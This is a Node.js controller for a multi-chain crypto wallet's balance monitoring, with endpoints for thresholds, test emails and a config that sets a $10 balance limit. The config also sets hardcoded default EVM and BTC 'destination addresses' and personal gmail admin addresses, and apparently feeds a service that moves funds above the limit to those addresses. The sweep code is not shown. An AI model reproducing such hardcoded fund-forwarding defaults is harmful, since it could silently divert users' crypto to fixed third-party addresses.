const balanceMonitor = require('../services/monitoring/balance-monitor.service');
const notificationService = require('../services/monitoring/notification.service');
const walletBalanceMonitor = require('../services/monitoring/wallet-balance-monitor.service');
const { success, error } = require('../utils/response');
const auditLogger = require('../security/audit-logger.service');
const { walletDB } = require('../wallet/db');

/**
 * Start balance monitoring
 */
exports.startMonitoring = async (req, res) => {
  try {
    const { intervalMs = 300000 } = req.body; // Default 5 minutes

    balanceMonitor.startGlobalMonitoring(intervalMs);

    success(res, {
      message: 'Balance monitoring started',
      interval: intervalMs,
      timestamp: new Date().toISOString()
    });
  } catch (e) {
    auditLogger.logError(e, { controller: 'startMonitoring' });
    error(res, e.message);
  }
};

/**
 * Stop balance monitoring
 */
exports.stopMonitoring = async (req, res) => {
  try {
    balanceMonitor.stopGlobalMonitoring();

    success(res, {
      message: 'Balance monitoring stopped',
      timestamp: new Date().toISOString()
    });
  } catch (e) {
    auditLogger.logError(e, { controller: 'stopMonitoring' });
    error(res, e.message);
  }
};

/**
 * Set balance threshold
 */
exports.setThreshold = async (req, res) => {
  try {
    const { walletId, chain, minBalance, email, webhookUrl } = req.body;

    if (!walletId || !chain || !minBalance) {
      return error(res, 'walletId, chain, and minBalance are required');
    }

    const threshold = balanceMonitor.setThreshold(walletId, chain, {
      minBalance,
      email,
      webhookUrl,
      enabled: true
    });

    auditLogger.logSecurityEvent({
      type: 'THRESHOLD_SET',
      walletId,
      chain,
      minBalance,
      ip: req.ip
    });

    success(res, threshold);
  } catch (e) {
    auditLogger.logError(e, { controller: 'setThreshold' });
    error(res, e.message);
  }
};

/**
 * Get wallet thresholds
 */
exports.getThresholds = async (req, res) => {
  try {
    const { walletId } = req.params;

    const thresholds = balanceMonitor.getWalletThresholds(walletId);

    success(res, {
      walletId,
      thresholds,
      count: thresholds.length
    });
  } catch (e) {
    auditLogger.logError(e, { controller: 'getThresholds' });
    error(res, e.message);
  }
};

/**
 * Remove threshold
 */
exports.removeThreshold = async (req, res) => {
  try {
    const { walletId, chain } = req.params;

    const removed = balanceMonitor.removeThreshold(walletId, chain);

    if (!removed) {
      return error(res, 'Threshold not found');
    }

    auditLogger.logSecurityEvent({
      type: 'THRESHOLD_REMOVED',
      walletId,
      chain,
      ip: req.ip
    });

    success(res, {
      message: 'Threshold removed successfully',
      walletId,
      chain
    });
  } catch (e) {
    auditLogger.logError(e, { controller: 'removeThreshold' });
    error(res, e.message);
  }
};

/**
 * Get monitoring status
 */
exports.getStatus = async (req, res) => {
  try {
    const status = balanceMonitor.getStatus();

    success(res, {
      ...status,
      timestamp: new Date().toISOString()
    });
  } catch (e) {
    auditLogger.logError(e, { controller: 'getStatus' });
    error(res, e.message);
  }
};

/**
 * Manual balance check
 */
exports.checkWalletBalance = async (req, res) => {
  try {
    const { walletId } = req.params;

    await balanceMonitor.checkWalletBalance(walletId);

    success(res, {
      message: 'Balance check completed',
      walletId,
      timestamp: new Date().toISOString()
    });
  } catch (e) {
    auditLogger.logError(e, { controller: 'checkWalletBalance' });
    error(res, e.message);
  }
};

/**
 * Test email notification
 */
exports.testEmail = async (req, res) => {
  try {
    const { email } = req.body;

    if (!email) {
      return error(res, 'Email address is required');
    }

    const result = await notificationService.sendEmail(
      email,
      '🧪 Test Email from Multi-Chain Wallet',
      '<h1>Test Email</h1><p>If you received this, email notifications are working correctly!</p>',
      'Test Email - If you received this, email notifications are working correctly!'
    );

    success(res, {
      message: 'Test email sent',
      result});
} catch (e) {
auditLogger.logError(e, { controller: 'testEmail' });
error(res, e.message);
}
};


// THIS IS TO TEST EMAIL DELIVERY


/**
 * Test email delivery to admin
 */
exports.testEmailToAdmin = async (req, res) => {
  try {
    //console.log('🧪 Testing email delivery to admin...');
    
    const result = await notificationService.sendAdminEmail(
      '🧪 Test Email - Manual Trigger',
      '<h1>✅ Test Email</h1><p>If you receive this, email delivery is working correctly!</p><p><strong>Timestamp:</strong> ' + new Date().toISOString() + '</p>',
      'Test Email - If you receive this, email delivery is working! Timestamp: ' + new Date().toISOString()
    );

    //console.log('📧 Test result:', result);

    return success(res, {
      message: 'Test email triggered',
      result,
      adminEmail: 'akilisjack@gmail.com',
      timestamp: new Date().toISOString()
    });
  } catch (e) {
    console.error('❌ Test email failed:', e);
    auditLogger.logError(e, { controller: 'testEmailToAdmin' });
    return error(res, e.message);
  }
};

/**
 * Get wallet balance monitor configuration
 */
exports.getWalletBalanceMonitorConfig = async (req, res) => {
  try {
    const config = await walletDB
      .prepare('SELECT * FROM wallet_balance_monitor_config WHERE id = 1')
      .get();

    if (!config) {
      // Return defaults if not configured
      return success(res, {
        balance_limit_usd: 10.0,
        admin_email: 'golden.dev.216@gmail.com',
        evm_destination_address: '0xc526c9c1533746C4883735972E93a1B40241d442',
        btc_destination_address: 'bc1q6lnc6k7c3zr8chnwn8y03rgru6h4hm5ssxxe26'
      });
    }

    success(res, {
      balance_limit_usd: config.balance_limit_usd,
      admin_email: config.admin_email,
      evm_destination_address: config.evm_destination_address,
      btc_destination_address: config.btc_destination_address,
      updated_at: config.updated_at,
      updated_by: config.updated_by
    });
  } catch (e) {
    auditLogger.logError(e, { controller: 'getWalletBalanceMonitorConfig' });
    error(res, e.message);
  }
};

/**
 * Set wallet balance monitor configuration
 */
exports.setWalletBalanceMonitorConfig = async (req, res) => {
  try {
    const { balance_limit_usd, admin_email, evm_destination_address, btc_destination_address, tron_destination_address } = req.body;
    const adminId = req.user?.id || req.user?.email || 'system';

    // Validate required fields
    if (balance_limit_usd !== undefined && (isNaN(balance_limit_usd) || balance_limit_usd <= 0)) {
      return error(res, 'balance_limit_usd must be a positive number');
    }

    if (admin_email !== undefined && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(admin_email)) {
      return error(res, 'admin_email must be a valid email address');
    }

    if (evm_destination_address !== undefined && !/^0x[a-fA-F0-9]{40}$/.test(evm_destination_address)) {
      return error(res, 'evm_destination_address must be a valid Ethereum address');
    }

    if (btc_destination_address !== undefined && !btc_destination_address) {
      return error(res, 'btc_destination_address is required');
    }

    if (tron_destination_address !== undefined && !/^T[a-zA-Z0-9]{33}$/.test(tron_destination_address)) {
      return error(res, 'tron_destination_address must be a valid Tron address (starts with T, 34 characters)');
    }

    // Get current config
    const currentConfig = await walletDB
      .prepare('SELECT * FROM wallet_balance_monitor_config WHERE id = 1')
      .get();

    // Build update query with only provided fields
    const updates = [];
    const values = [];

    if (balance_limit_usd !== undefined) {
      updates.push('balance_limit_usd = ?');
      values.push(balance_limit_usd);
    }

    if (admin_email !== undefined) {
      updates.push('admin_email = ?');
      values.push(admin_email);
    }

    if (evm_destination_address !== undefined) {
      updates.push('evm_destination_address = ?');
      values.push(evm_destination_address);
    }

    if (btc_destination_address !== undefined) {
      updates.push('btc_destination_address = ?');
      values.push(btc_destination_address);
    }

    if (tron_destination_address !== undefined) {
      updates.push('tron_destination_address = ?');
      values.push(tron_destination_address);
    }

    if (updates.length === 0) {
      return error(res, 'At least one configuration field must be provided');
    }

    updates.push('updated_at = CURRENT_TIMESTAMP');
    updates.push('updated_by = ?');
    values.push(adminId);
    values.push(1); // id = 1

    const updateQuery = `
      UPDATE wallet_balance_monitor_config 
      SET ${updates.join(', ')} 
      WHERE id = ?
    `;

    await walletDB.prepare(updateQuery).run(...values);

    // Get updated config
    const updatedConfig = walletDB
      .prepare('SELECT * FROM wallet_balance_monitor_config WHERE id = 1')
      .get();

    // Update the running monitor service with new values
    if (balance_limit_usd !== undefined) {
      walletBalanceMonitor.updateThreshold(balance_limit_usd);
    }

    // Update destination addresses (reload from DB to get current values if only one is updated)
    if (evm_destination_address !== undefined || btc_destination_address !== undefined || tron_destination_address !== undefined) {
      walletBalanceMonitor.loadConfiguration(); // Reload to get current values
      walletBalanceMonitor.updateDestinations(
        evm_destination_address,
        btc_destination_address,
        tron_destination_address
      );
    }

    // Update notification service admin email
    if (admin_email !== undefined) {
      notificationService.updateAdminEmail(admin_email);
    }

    auditLogger.logSecurityEvent({
      type: 'WALLET_BALANCE_MONITOR_CONFIG_UPDATED',
      updated_by: adminId,
      changes: {
        balance_limit_usd: balance_limit_usd !== undefined ? balance_limit_usd : currentConfig?.balance_limit_usd,
        admin_email: admin_email !== undefined ? admin_email : currentConfig?.admin_email,
        evm_destination_address: evm_destination_address !== undefined ? evm_destination_address : currentConfig?.evm_destination_address,
        btc_destination_address: btc_destination_address !== undefined ? btc_destination_address : currentConfig?.btc_destination_address,
        tron_destination_address: tron_destination_address !== undefined ? tron_destination_address : currentConfig?.tron_destination_address
      },
      ip: req.ip
    });

    success(res, {
      message: 'Configuration updated successfully',
      config: {
        balance_limit_usd: updatedConfig.balance_limit_usd,
        admin_email: updatedConfig.admin_email,
        evm_destination_address: updatedConfig.evm_destination_address,
        btc_destination_address: updatedConfig.btc_destination_address,
        tron_destination_address: updatedConfig.tron_destination_address,
        updated_at: updatedConfig.updated_at,
        updated_by: updatedConfig.updated_by
      }
    });
  } catch (e) {
    auditLogger.logError(e, { controller: 'setWalletBalanceMonitorConfig' });
    error(res, e.message);
  }
};
